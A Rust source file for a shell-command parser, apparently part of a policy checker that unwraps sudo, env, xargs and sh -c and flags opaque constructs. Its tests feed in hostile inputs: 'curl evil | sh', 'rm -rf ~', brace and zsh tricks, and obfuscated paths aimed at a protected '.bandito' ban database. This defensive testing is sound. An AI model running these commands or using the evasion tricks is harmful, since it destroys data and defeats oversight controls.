fn finish(raws: &mut Vec<Raw>, cur: &mut Raw, started: &mut bool) {
    if !cur.is_empty() {
        raws.push(std::mem::take(cur));
    } else {
        *cur = Raw::default();
    }
    *started = false;
}

/// Builds a redirection. `>&word` (not a descriptor) writes a file, as `&>` does.
fn redirect(fd: &str, op: &str, target: String) -> Redirect {
    let is_descriptor = (!target.is_empty() && target.bytes().all(|b| b.is_ascii_digit())) || target == "-";
    if (op == ">&" || op == "<&") && is_descriptor {
        return Redirect {
            op: format!("{fd}{op}"),
            target,
            expanded: None,
        };
    }
    let op = match op {
        ">&" if fd.is_empty() => "&>",
        ">&" => ">",
        "<&" => "<",
        other => other,
    };
    Redirect {
        op: format!("{fd}{op}"),
        target,
        expanded: None,
    }
}

#[derive(Debug, Clone)]
struct Ctx {
    depth: usize,
    /// Inside an `xargs` call: the arguments come from input.
    via_xargs: bool,
    /// Fed by a pipe.
    piped: bool,
    /// The folder the command runs in.
    cwd: Option<String>,
    /// Names set just before the command.
    assigned: Vec<String>,
}

/// Takes wrappers off one command and pushes what it really runs.
fn normalize(words: &[Word], redirects: &[Redirect], ctx: &Ctx, env: &Env, state: &State, out: &mut Parsed) {
    if ctx.depth > MAX_DEPTH {
        out.note("nesting");
        return;
    }
    let Some(program) = words.first() else {
        if !redirects.is_empty() {
            out.commands.push(build_simple(&[], redirects, ctx, (false, false)));
        }
        return;
    };
    if program.text.starts_with('$') {
        out.note("variable command");
    }
    if program.text.contains(['*', '?', '[']) {
        out.note("glob command");
    }
    let name = basename(&program.text);
    if name == "eval" {
        out.note("eval");
    }
    let rest = &words[1..];
    let texts: Vec<&str> = rest.iter().map(|w| w.text.as_str()).collect();
    // The words after `k` (indexes into `words`), clamped so a wrapper with nothing after its options is harmless.
    let from = |k: usize| &words[k.min(words.len())..];
    let inner = Ctx {
        depth: ctx.depth + 1,
        ..ctx.clone()
    };
    match name {
        "sudo" => normalize(
            from(1 + after_options(&texts, SUDO_VALUE_FLAGS)),
            redirects,
            &inner,
            env,
            state,
            out,
        ),
        "doas" => normalize(
            from(1 + after_options(&texts, DOAS_VALUE_FLAGS)),
            redirects,
            &inner,
            env,
            state,
            out,
        ),
        "env" => {
            if texts.iter().any(|a| a.starts_with("-S")) {
                out.note("env -S");
            }
            let mut i = after_options(&texts, ENV_VALUE_FLAGS);
            let mut assigned = inner.assigned.clone();
            while i < texts.len() && is_assignment(texts[i]) {
                assigned.push(split_assignment(texts[i]).0.to_string());
                i += 1;
            }
            let with_env = Ctx { assigned, ..inner };
            normalize(from(1 + i), redirects, &with_env, env, state, out);
        }
        "nice" => normalize(
            from(1 + after_options(&texts, &["-n"])),
            redirects,
            &inner,
            env,
            state,
            out,
        ),
        "nohup" | "setsid" | "unbuffer" | "command" | "builtin" | "busybox" | "toybox" => {
            // `busybox rm` runs the applet `rm`; the options before it are not modelled.
            let k = if matches!(name, "busybox" | "toybox") {
                1
            } else {
                1 + after_options(&texts, &[])
            };
            normalize(from(k), redirects, &inner, env, state, out)
        }
        "exec" => normalize(
            from(1 + after_options(&texts, &["-a"])),
            redirects,
            &inner,
            env,
            state,
            out,
        ),
        "time" => normalize(
            from(1 + after_options(&texts, &["-f", "-o"])),
            redirects,
            &inner,
            env,
            state,
            out,
        ),
        "timeout" => {
            let at = skip_one(&texts, after_options(&texts, TIMEOUT_VALUE_FLAGS));
            normalize(from(1 + at), redirects, &inner, env, state, out)
        }
        "stdbuf" => normalize(
            from(1 + after_options(&texts, &["-i", "-o", "-e"])),
            redirects,
            &inner,
            env,
            state,
            out,
        ),
        "ionice" => normalize(
            from(1 + after_options(&texts, IONICE_VALUE_FLAGS)),
            redirects,
            &inner,
            env,
            state,
            out,
        ),
        "chrt" | "taskset" => {
            let at = skip_one(&texts, after_options(&texts, &[]));
            normalize(from(1 + at), redirects, &inner, env, state, out)
        }
        "xargs" => {
            let xargs = Ctx {
                via_xargs: true,
                piped: false,
                ..inner
            };
            normalize(
                from(1 + after_options(&texts, XARGS_VALUE_FLAGS)),
                redirects,
                &xargs,
                env,
                state,
                out,
            );
        }
        "find" => find(words, redirects, ctx, env, state, out),
        "sh" | "bash" | "zsh" | "dash" | "ksh" => match shell_script(&texts) {
            Some(script) => merge(out, parse_state(script, ctx.depth + 1, env, state.clone()), redirects),
            None => push_plain(words, redirects, ctx, out),
        },
        _ => push_plain(words, redirects, ctx, out),
    }
}

/// `find`: the call itself (with `-delete` / `-exec` flags) and the commands its `-exec` runs.
fn find(words: &[Word], redirects: &[Redirect], ctx: &Ctx, env: &Env, state: &State, out: &mut Parsed) {
    let rest = &words[1..];
    let texts: Vec<&str> = rest.iter().map(|w| w.text.as_str()).collect();
    let delete = texts.contains(&"-delete");
    let exec = texts.iter().any(|a| EXEC_FLAGS.contains(a));
    out.commands.push(build_simple(words, redirects, ctx, (delete, exec)));
    let inner = Ctx {
        depth: ctx.depth + 1,
        via_xargs: false,
        piped: false,
        ..ctx.clone()
    };
    let mut i = 0;
    while i < texts.len() {
        if EXEC_FLAGS.contains(&texts[i]) {
            let start = i + 1;
            let mut end = start;
            while end < texts.len() && texts[end] != ";" && texts[end] != "+" {
                end += 1;
            }
            normalize(&rest[start.min(rest.len())..end], redirects, &inner, env, state, out);
            i = end + 1;
        } else {
            i += 1;
        }
    }
}

/// A command that is not a wrapper. Notes what an interpreter fed by a pipe or xargs would run.
fn push_plain(words: &[Word], redirects: &[Redirect], ctx: &Ctx, out: &mut Parsed) {
    let name = basename(&words[0].text);
    let rest: Vec<&str> = words[1..].iter().map(|w| w.text.as_str()).collect();
    if (ctx.piped || ctx.via_xargs) && is_interpreter(name) {
        if rest.iter().all(|a| a.starts_with('-')) {
            out.note("stdin into interpreter");
        } else if !is_shell(name) && rest.iter().any(|a| matches!(*a, "-c" | "-e" | "-E" | "--eval")) {
            out.note("inline code from a pipe");
        }
    }
    out.commands.push(build_simple(words, redirects, ctx, (false, false)));
}

/// A simple command from its words (`words[0]` is the program as written; may be empty).
fn build_simple(words: &[Word], redirects: &[Redirect], ctx: &Ctx, find: (bool, bool)) -> SimpleCommand {
    let program = words.first().map(|w| w.text.clone()).unwrap_or_default();
    let argv: Vec<String> = words
        .iter()
        .enumerate()
        .map(|(i, w)| {
            if i == 0 {
                basename(&w.text).to_string()
            } else {
                w.text.clone()
            }
        })
        .collect();
    SimpleCommand {
        argv,
        program,
        expanded: words.iter().map(|w| w.exp.clone()).collect(),
        redirects: redirects.to_vec(),
        cwd: ctx.cwd.clone(),
        assigned: ctx.assigned.clone(),
        via_xargs: ctx.via_xargs,
        find_delete: find.0,
        find_exec: find.1,
    }
}

/// For `sh -c SCRIPT` (options such as `-lc`, `-e -c`, `-o pipefail -c` allowed): the script.
fn shell_script<'a>(args: &[&'a str]) -> Option<&'a str> {
    let mut i = 0;
    while i < args.len() {
        let a = args[i];
        if a == "-c" || (a.len() > 1 && a.starts_with('-') && !a.starts_with("--") && a[1..].contains('c')) {
            return args.get(i + 1).copied();
        }
        if matches!(a, "-o" | "+o" | "-O" | "+O") {
            i += 2;
        } else if (a.starts_with('-') || a.starts_with('+')) && a.len() > 1 && a != "--" {
            i += 1;
        } else {
            return None;
        }
    }
    None
}

/// Index of the first argument after a wrapper's options. `value_flags` take the next argument as their value.
/// Never past the end: a value flag at the end leaves nothing to run.
fn after_options(args: &[&str], value_flags: &[&str]) -> usize {
    let mut i = 0;
    while i < args.len() {
        let a = args[i];
        if a == "--" {
            return (i + 1).min(args.len());
        }
        if a.len() < 2 || !a.starts_with('-') {
            return i;
        }
        i += if value_flags.contains(&a) { 2 } else { 1 };
    }
    args.len()
}

/// One more positional argument (a duration, a mask, a priority) after the options; never past the end.
fn skip_one(args: &[&str], index: usize) -> usize {
    (index + 1).min(args.len())
}

/// Commands from a parsed script join the outer command: the outer redirections apply to them too.
fn merge(out: &mut Parsed, inner: Parsed, redirects: &[Redirect]) {
    for mut cmd in inner.commands {
        cmd.redirects.extend(redirects.iter().cloned());
        out.commands.push(cmd);
    }
    for why in inner.opaque {
        out.note(why);
    }
}

fn basename(program: &str) -> &str {
    program.rsplit('/').next().unwrap_or(program)
}

/// `NAME=value` with a valid NAME: a shell assignment, not a command.
fn is_assignment(word: &str) -> bool {
    word.split_once('=').is_some_and(|(name, _)| is_name(name))
}

/// `NAME=value` as (NAME, value). A word without `=` gives (word, "").
fn split_assignment(word: &str) -> (&str, &str) {
    word.split_once('=').unwrap_or((word, ""))
}

fn is_shell(name: &str) -> bool {
    matches!(name, "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish")
}

/// Programs that run whatever they read: shells, Python, Perl, Ruby, Node.
fn is_interpreter(name: &str) -> bool {
    is_shell(name) || name.starts_with("python") || matches!(name, "perl" | "ruby" | "node")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_env() -> Env {
        Env {
            home: "/home/u".into(),
            bandito_home: "/home/u/.bandito".into(),
            users: |name| (name == "u").then(|| "/home/u".to_string()),
        }
    }

    /// Parses in the folder `/home/u/app`.
    fn p(cmd: &str) -> Parsed {
        parse(cmd, Some("/home/u/app"), &test_env())
    }

    fn words(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| s.to_string()).collect()
    }

    fn argvs(cmd: &str) -> Vec<Vec<String>> {
        p(cmd).commands.into_iter().map(|c| c.argv).collect()
    }

    fn opaque(cmd: &str) -> Vec<&'static str> {
        p(cmd).opaque
    }

    fn redirects(cmd: &str) -> Vec<(String, String)> {
        p(cmd)
            .commands
            .into_iter()
            .flat_map(|c| c.redirects)
            .map(|r| (r.op, r.target))
            .collect()
    }

    #[test]
    fn splits_on_every_separator() {
        assert_eq!(
            argvs("a && b || c; d | e |& f & g\nh"),
            vec![
                words(&["a"]),
                words(&["b"]),
                words(&["c"]),
                words(&["d"]),
                words(&["e"]),
                words(&["f"]),
                words(&["g"]),
                words(&["h"]),
            ]
        );
    }

    #[test]
    fn single_quotes_are_literal() {
        assert_eq!(argvs("echo 'a $b \"c\"  d'"), vec![words(&["echo", "a $b \"c\"  d"])]);
    }

    #[test]
    fn double_quotes_keep_only_the_listed_escapes() {
        assert_eq!(
            argvs(r#"echo "a \"b\" \\ \$x \n""#),
            vec![words(&["echo", r#"a "b" \ $x \n"#])]
        );
    }

    #[test]
    fn backslash_outside_quotes_escapes_one_char() {
        assert_eq!(argvs(r"echo a\ b"), vec![words(&["echo", "a b"])]);
    }

    #[test]
    fn adjacent_parts_join_into_one_word() {
        assert_eq!(argvs("'r'm -rf x"), vec![words(&["rm", "-rf", "x"])]);
        assert_eq!(argvs(r#"/bin/r"m" x"#), vec![words(&["rm", "x"])]);
    }

    #[test]
    fn braces_and_parentheses_separate_commands() {
        assert_eq!(
            argvs("{ rm -rf x; } && (git push)"),
            vec![words(&["rm", "-rf", "x"]), words(&["git", "push"])]
        );
    }

    #[test]
    fn program_keeps_its_path_and_argv_gets_the_basename() {
        let cmd = &p("/usr/bin/rm x").commands[0];
        assert_eq!(cmd.argv, words(&["rm", "x"]));
        assert_eq!(cmd.program, "/usr/bin/rm");
    }

    #[test]
    fn redirects_attached_and_separate() {
        assert_eq!(
            redirects("echo x >out.txt 2>> err.log"),
            vec![
                (">".to_string(), "out.txt".to_string()),
                ("2>>".to_string(), "err.log".to_string()),
            ]
        );
    }

    #[test]
    fn descriptor_duplication_is_not_a_file() {
        let r = &p("cargo test 2>&1").commands[0].redirects;
        assert_eq!(r[0].op, "2>&");
        assert_eq!(r[0].target, "1");
        assert!(!r[0].writes_file());
    }

    #[test]
    fn ampersand_redirect_writes_both_streams() {
        assert_eq!(
            redirects("cmd &>out.log &>>more.log"),
            vec![
                ("&>".to_string(), "out.log".to_string()),
                ("&>>".to_string(), "more.log".to_string()),
            ]
        );
    }

    #[test]
    fn redirect_without_a_space_before_a_quoted_target() {
        assert_eq!(
            redirects(r#"echo x >"a b""#),
            vec![(">".to_string(), "a b".to_string())]
        );
    }

    #[test]
    fn heredoc_is_opaque_and_its_body_is_not_read() {
        let parsed = p("cat <<EOF\nrm -rf ~\nEOF\necho ok");
        assert_eq!(parsed.opaque, vec!["heredoc"]);
        assert_eq!(
            parsed.commands.iter().map(|c| c.argv.clone()).collect::<Vec<_>>(),
            vec![words(&["cat"]), words(&["echo", "ok"])]
        );
    }

    #[test]
    fn indented_heredoc_delimiter_may_be_tab_indented() {
        let parsed = p("cat <<-'X'\n\trm -rf ~\n\tX\nls");
        assert_eq!(parsed.opaque, vec!["heredoc"]);
        assert_eq!(parsed.commands.len(), 2);
    }

    #[test]
    fn here_string_is_opaque_and_its_word_is_data() {
        let parsed = p("grep x <<< rm");
        assert_eq!(parsed.opaque, vec!["heredoc"]);
        assert_eq!(parsed.commands[0].argv, words(&["grep", "x"]));
    }

    #[test]
    fn unclosed_quote_is_opaque() {
        assert_eq!(opaque("echo \"abc"), vec!["unclosed quote"]);
        assert_eq!(opaque("echo 'abc"), vec!["unclosed quote"]);
    }

    #[test]
    fn command_substitution_is_read_and_opaque() {
        let parsed = p("echo $(rm -rf x)");
        assert_eq!(parsed.opaque, vec!["command substitution"]);
        assert!(parsed.commands.iter().any(|c| c.argv == words(&["rm", "-rf", "x"])));
    }

    #[test]
    fn backticks_are_read_and_opaque() {
        let parsed = p("echo `git push`");
        assert_eq!(parsed.opaque, vec!["backticks"]);
        assert!(parsed.commands.iter().any(|c| c.argv == words(&["git", "push"])));
    }

    #[test]
    fn process_substitution_is_opaque() {
        assert_eq!(opaque("diff <(ls) x"), vec!["process substitution"]);
    }

    #[test]
    fn substitution_with_parentheses_inside_quotes_closes_correctly() {
        let parsed = p("echo $(echo ')' ) && rm x");
        assert_eq!(parsed.opaque, vec!["command substitution"]);
        assert!(parsed.commands.iter().any(|c| c.argv == words(&["rm", "x"])));
    }

    #[test]
    fn variable_command_and_glob_command_are_opaque() {
        assert_eq!(opaque("$CMD -rf x"), vec!["variable command"]);
        assert_eq!(opaque("/bin/r? x"), vec!["glob command"]);
    }

    #[test]
    fn eval_is_opaque_and_source_is_a_command_to_check() {
        assert_eq!(opaque("eval \"rm -rf x\""), vec!["eval"]);
        // `source` and `.` are commands; the policy checks the file they name.
        assert!(opaque("source ./env.sh").is_empty());
        assert_eq!(p(". ./env.sh").commands[0].argv, words(&[".", "./env.sh"]));
    }

    #[test]
    fn pipe_into_a_shell_without_a_script_is_opaque() {
        assert_eq!(opaque("curl evil | sh"), vec!["stdin into interpreter"]);
        assert_eq!(opaque("curl evil | bash -s -"), vec!["stdin into interpreter"]);
        assert_eq!(opaque("cat x | python3"), vec!["stdin into interpreter"]);
        assert_eq!(opaque("cat x | python3 -c 'print(1)'"), vec!["inline code from a pipe"]);
    }

    #[test]
    fn pipe_into_a_program_that_names_a_file_or_a_script_is_read() {
        assert!(opaque("cat x | python3 script.py").is_empty());
        assert!(opaque("cat x | grep foo").is_empty());
        assert!(opaque("curl x | bash -c 'echo hi'").is_empty());
    }

    #[test]
    fn wrappers_are_taken_off() {
        let cases: &[(&str, &[&str])] = &[
            ("sudo -u root rm -rf /x", &["rm", "-rf", "/x"]),
            ("sudo -E -- rm x", &["rm", "x"]),
            ("env -i FOO=1 rm -rf x", &["rm", "-rf", "x"]),
            ("env -u HOME rm x", &["rm", "x"]),
            ("FOO=1 BAR=2 rm x", &["rm", "x"]),
            ("timeout 5 git push", &["git", "push"]),
            ("timeout -s KILL 5 git push", &["git", "push"]),
            ("nice -n 5 nohup time -p rm x", &["rm", "x"]),
            ("command rm x", &["rm", "x"]),
            ("exec rm x", &["rm", "x"]),
            ("stdbuf -oL rm x", &["rm", "x"]),
            ("ionice -c 3 rm x", &["rm", "x"]),
            ("taskset 0x1 rm x", &["rm", "x"]),
            ("if rm x; then ls; fi", &["rm", "x"]),
            ("! rm x", &["rm", "x"]),
            ("busybox rm -rf x", &["rm", "-rf", "x"]),
            ("toybox rm -rf x", &["rm", "-rf", "x"]),
        ];
        for (cmd, want) in cases {
            let got = argvs(cmd);
            assert!(got.contains(&words(want)), "{cmd}: {got:?}");
        }
    }

    #[test]
    fn xargs_marks_its_command() {
        let parsed = p("find . | xargs -0 -I {} rm -rf {}");
        let rm = parsed.commands.iter().find(|c| c.argv[0] == "rm").expect("rm");
        assert!(rm.via_xargs);
        assert!(!parsed.commands.iter().any(|c| c.argv[0] == "find" && c.via_xargs));
    }

    #[test]
    fn xargs_into_a_shell_is_opaque() {
        assert_eq!(opaque("find . | xargs sh"), vec!["stdin into interpreter"]);
    }

    #[test]
    fn shell_dash_c_is_read_with_any_options() {
        let cases = [
            ("sh -lc \"rm -rf /tmp/x\"", vec!["rm", "-rf", "/tmp/x"]),
            ("bash -c 'git push origin'", vec!["git", "push", "origin"]),
            ("bash -e -c 'rm x'", vec!["rm", "x"]),
            ("bash -o pipefail -c 'rm x'", vec!["rm", "x"]),
        ];
        for (cmd, want) in cases {
            assert!(argvs(cmd).contains(&words(&want)), "{cmd}");
        }
    }

    #[test]
    fn shell_script_file_is_not_read() {
        let parsed = p("bash ./deploy.sh");
        assert_eq!(parsed.commands[0].argv, words(&["bash", "./deploy.sh"]));
        assert!(parsed.opaque.is_empty());
    }

    #[test]
    fn find_exec_and_delete_are_read() {
        let parsed = p("find /tmp -exec rm -rf {} +");
        assert!(parsed.commands.iter().any(|c| c.argv == words(&["rm", "-rf", "{}"])));
        assert!(parsed.commands.iter().any(|c| c.find_exec));
        let parsed = p(r"find . -name x -exec echo {} \; -delete");
        assert!(parsed.commands.iter().any(|c| c.argv == words(&["echo", "{}"])));
        let find = parsed.commands.iter().find(|c| c.argv[0] == "find").expect("find");
        assert!(find.find_delete);
    }

    #[test]
    fn assignment_only_line_runs_nothing() {
        assert!(p("FOO=1").commands.is_empty());
    }

    #[test]
    fn redirect_only_line_keeps_its_target() {
        let parsed = p("> ~/.bashrc");
        assert_eq!(parsed.commands.len(), 1);
        assert!(parsed.commands[0].argv.is_empty());
        assert_eq!(parsed.commands[0].redirects[0].target, "~/.bashrc");
        assert_eq!(
            parsed.commands[0].redirects[0].expanded.as_deref(),
            Some("/home/u/.bashrc")
        );
    }

    #[test]
    fn comment_text_is_not_a_command() {
        assert_eq!(argvs("echo hi # rm -rf x"), vec![words(&["echo", "hi"])]);
        assert_eq!(argvs("echo a#b"), vec![words(&["echo", "a#b"])]);
    }

    #[test]
    fn line_continuation_joins_lines() {
        assert_eq!(argvs("rm \\\n  -rf x"), vec![words(&["rm", "-rf", "x"])]);
    }

    #[test]
    fn nesting_beyond_the_limit_is_opaque() {
        let mut s = "echo hi".to_string();
        for _ in 0..12 {
            s = format!("echo $({s})");
        }
        assert!(opaque(&s).contains(&"nesting"));
    }

    #[test]
    fn nesting_within_the_limit_is_read() {
        let parsed = p("echo $(echo $(echo $(rm x)))");
        assert!(!parsed.opaque.contains(&"nesting"));
        assert!(parsed.commands.iter().any(|c| c.argv == words(&["rm", "x"])));
    }

    #[test]
    fn long_line_is_opaque_and_not_read() {
        let parsed = p(&"x ".repeat(40_000));
        assert_eq!(parsed.opaque, vec!["too long"]);
        assert!(parsed.commands.is_empty());
    }

    #[test]
    fn many_unclosed_substitutions_finish_quickly() {
        let started = std::time::Instant::now();
        let parsed = p(&"$(".repeat(30_000));
        assert!(parsed.opaque.contains(&"unclosed substitution"));
        assert!(started.elapsed() < std::time::Duration::from_secs(2));
    }

    #[test]
    fn many_wrappers_are_bounded_by_depth() {
        let line = format!("{}rm x", "sudo ".repeat(20));
        assert!(opaque(&line).contains(&"nesting"));
    }

    // --- brace and zsh expansion ---

    #[test]
    fn brace_expansion_is_opaque_but_plain_braces_are_not() {
        for cmd in [
            "{rm,-rf,~}",
            "sh -c '{rm,-rf,x}'",
            "zsh -c \"{rm,-rf,x}\"",
            "echo {a..b}",
        ] {
            assert!(p(cmd).opaque.contains(&"brace expansion"), "{cmd}");
        }
        for cmd in ["echo {}", "find . -exec x {} +", "git log --format='{x}'"] {
            assert!(p(cmd).opaque.is_empty(), "{cmd}");
        }
    }

    #[test]
    fn zsh_equals_word_is_opaque() {
        assert!(p("=rm -rf x").opaque.contains(&"zsh =word"));
    }

    #[test]
    fn option_values_at_the_end_do_not_panic() {
        for cmd in [
            "sudo -u",
            "env -S",
            "xargs -I",
            "nice -n",
            "exec -a",
            "timeout",
            "stdbuf -o",
        ] {
            let _ = p(cmd);
        }
    }

    // --- expansion and the folder ---

    #[test]
    fn home_variables_and_tilde_are_expanded() {
        let parsed = p("cat ~/a \"$HOME/b\" ${HOME}/c ~u/d $BANDITO_HOME/e");
        let exp: Vec<Option<String>> = parsed.commands[0].expanded.clone();
        assert_eq!(
            exp,
            vec![
                Some("cat".into()),
                Some("/home/u/a".into()),
                Some("/home/u/b".into()),
                Some("/home/u/c".into()),
                Some("/home/u/d".into()),
                Some("/home/u/.bandito/e".into()),
            ]
        );
    }

    #[test]
    fn unknown_names_and_users_expand_to_none() {
        let parsed = p("cat $UNSET/x ~nobody/y $1 ${A:-b}");
        assert_eq!(parsed.commands[0].expanded[1], None);
        assert_eq!(parsed.commands[0].expanded[2], None);
        assert_eq!(parsed.commands[0].expanded[3], None);
        assert_eq!(parsed.commands[0].expanded[4], None);
    }

    #[test]
    fn assignments_on_the_line_are_followed() {
        let parsed = p("X=/home/u/.bandit\"\"o; cat \"$X\"/ban*.db");
        let cat = parsed.commands.iter().find(|c| c.argv[0] == "cat").expect("cat");
        assert_eq!(cat.expanded[1].as_deref(), Some("/home/u/.bandito/ban*.db"));
    }

    #[test]
    fn export_is_followed_and_prefix_assignment_is_not() {
        let parsed = p("export X=/home/u/.bandito; cat $X/a; Y=/tmp cat $Y/b");
        let cats: Vec<&SimpleCommand> = parsed.commands.iter().filter(|c| c.argv[0] == "cat").collect();
        assert_eq!(cats[0].expanded[1].as_deref(), Some("/home/u/.bandito/a"));
        assert_eq!(cats[1].expanded[1], None);
        assert_eq!(cats[1].assigned, vec!["Y".to_string()]);
    }

    #[test]
    fn ansi_c_quoting_is_decoded() {
        let parsed = p(r"cat $'/home/u/.band\x69to/ban*.db'");
        assert_eq!(parsed.commands[0].argv[1], "/home/u/.bandito/ban*.db");
        let parsed = p(r"echo $'a\tb\101A'");
        assert_eq!(parsed.commands[0].argv[1], "a\tbAA");
    }

    #[test]
    fn cd_moves_the_folder_for_the_commands_after_it() {
        let parsed = p("cd ~ && cd .bandito && cat *");
        let cat = parsed.commands.iter().find(|c| c.argv[0] == "cat").expect("cat");
        assert_eq!(cat.cwd.as_deref(), Some("/home/u/.bandito"));
        let parsed = p("cd - && rm a");
        let rm = parsed.commands.iter().find(|c| c.argv[0] == "rm").expect("rm");
        assert_eq!(rm.cwd, None);
    }

    #[test]
    fn subshell_restores_the_folder_and_variables() {
        let parsed = p("(cd ~ && X=/a) && cat x");
        let cat = parsed.commands.iter().find(|c| c.argv[0] == "cat").expect("cat");
        assert_eq!(cat.cwd.as_deref(), Some("/home/u/app"));
        let parsed = p("(X=/a); cat $X");
        let cat = parsed.commands.iter().find(|c| c.argv[0] == "cat").expect("cat");
        assert_eq!(cat.expanded[1], None);
    }

    #[test]
    fn pushd_and_popd_follow_the_stack() {
        let parsed = p("pushd ~ >/dev/null; cat x; popd; cat y");
        let cats: Vec<&SimpleCommand> = parsed.commands.iter().filter(|c| c.argv[0] == "cat").collect();
        assert_eq!(cats[0].cwd.as_deref(), Some("/home/u"));
        assert_eq!(cats[1].cwd.as_deref(), Some("/home/u/app"));
        let parsed = p("popd && rm a");
        let rm = parsed.commands.iter().find(|c| c.argv[0] == "rm").expect("rm");
        assert_eq!(rm.cwd, None);
    }

    #[test]
    fn cd_in_a_pipeline_leaves_the_folder_unknown() {
        let parsed = p("cd ~ | cat; cat .bandito/x");
        let cat = parsed.commands.iter().rfind(|c| c.argv[0] == "cat").expect("cat");
        assert_eq!(cat.cwd, None);
    }

    #[test]
    fn nested_shell_sees_the_folder_and_variables_of_its_line() {
        let parsed = p("cd ~ && sh -c 'cat .bandito/x'");
        let cat = parsed.commands.iter().find(|c| c.argv[0] == "cat").expect("cat");
        assert_eq!(cat.cwd.as_deref(), Some("/home/u"));
    }

    #[test]
    fn substitution_starts_with_an_unknown_folder() {
        let parsed = p("cd ~ && echo $(cat x)");
        let cat = parsed.commands.iter().find(|c| c.argv[0] == "cat").expect("cat");
        assert_eq!(cat.cwd, None);
    }

    #[test]
    fn plain_redirect_target_expands_with_the_line() {
        let parsed = p("X=/home/u/.bandito; echo hi > $X/notes");
        let echo = parsed.commands.iter().find(|c| c.argv[0] == "echo").expect("echo");
        assert_eq!(echo.redirects[0].expanded.as_deref(), Some("/home/u/.bandito/notes"));
    }
}
